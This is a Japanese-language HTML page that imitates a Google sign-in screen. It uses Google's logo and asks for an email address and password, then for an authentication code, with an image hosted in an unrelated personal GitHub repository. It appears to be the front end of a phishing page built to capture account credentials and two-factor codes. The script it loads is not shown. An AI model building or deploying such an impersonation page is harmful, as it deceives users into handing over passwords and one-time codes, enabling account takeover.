<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ログイン</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="image-container">
        <img src="https://raw.githubusercontent.com/Hazimeteotukaisab/Google_and_playPenis_love/main/imge/IMG_4375.png" alt="Top Image" class="top-image">
    </div>
    <div class="login-container">
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
            <h1>ログイン</h1>
            <form id="login-form">
                <div class="input-group">
                    <input type="email" id="email" required>
                    <label for="email">メールアドレス</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" required>
                    <label for="password">パスワード</label>
                </div>
                <button type="button" class="login-button" onclick="sendAuthCode()">ログイン</button>
            </form>
            <form id="auth-form" style="display: none;">
                <div class="input-group">
                    <input type="text" id="auth-code" required>
                    <label for="auth-code">認証コード</label>
                </div>
                <button type="button" class="login-button" onclick="verifyAuthCode()">認証</button>
            </form>
            <p class="signup-text">アカウントをお持ちでない場合 <a href="https://accounts.google.com/signup">アカウント作成</a></p>
        </div>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
